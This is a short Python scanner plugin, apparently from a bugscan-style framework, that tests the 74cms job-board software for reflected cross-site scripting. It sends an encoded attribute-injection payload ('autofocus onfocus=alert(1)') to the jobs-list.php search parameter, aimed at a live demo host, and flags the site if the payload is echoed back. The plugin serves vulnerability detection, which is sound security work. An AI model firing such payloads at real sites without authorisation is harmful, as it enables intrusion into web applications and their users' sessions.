#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = '1610519747@qq.com' 
import re

def assign(service, arg):
    if service == "74cms":
        return True, arg

def audit(arg): 
    payload = '/jobs/jobs-list.php?key=%22%20autofocus%20onfocus=alert%281%29%20style=%22%22'
    code, head, res, errcode, _ = curl.curl2(arg+payload)
    if code == 200 and '" autofocus onfocus=alert(1) style=' in res:
        security_info('反射型 xss '+arg+payload)   

if __name__ == '__main__':
    from dummy import *
    audit(assign('74cms', 'http://demo.74cms.com')[1])

